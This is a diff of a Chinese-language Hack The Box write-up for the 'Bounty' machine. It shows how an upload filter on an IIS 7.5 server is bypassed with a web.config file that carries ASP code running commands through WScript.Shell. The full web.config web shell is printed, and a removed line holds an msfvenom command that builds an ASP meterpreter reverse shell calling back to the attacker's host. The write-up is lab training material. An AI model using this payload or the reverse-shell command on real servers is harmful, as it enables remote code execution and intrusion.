@@ -46,13 +46,50 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ```
 
-transfer.aspx是一个文件上传页面,测试发现不可以直接上传aspx文件，可以上传jpg文件
+transfer.aspx是一个文件上传页面,测试发现不可以直接上传aspx文件，可以上传jpg,png,gif等文件，但是不能上传asp文件
 
 所有成功上传的文件都会到uploadedfiles下，不过这个目录下的文件过一段时间（几十秒）就会被删除
 
+查了下IIS7.5下有一个畸形解析漏洞，但是好像无法复现
 
+然后找到了[这篇文章](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)
 
+可以上传一个```web.config```文件，在注释里执行asp代码
+```
+┌──(root💀kali)-[~/htb/Bounty]
+└─# cat web.config 
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+   <appSettings>
+</appSettings>
+</configuration>
+<!–-
+<% Response.write("-"&"->")
+Response.write("<pre>")
+Set wShell1 = CreateObject("WScript.Shell")
+Set cmd1 = wShell1.Exec("ipconfig")
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write("</pre><!-"&"-") %>
 
+-–>
 
+```
+上面文件上传以后访问```http://10.10.10.93/uploadedfiles/web.config```成功打印```ipconfig```命令
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f asp > shell.aspx
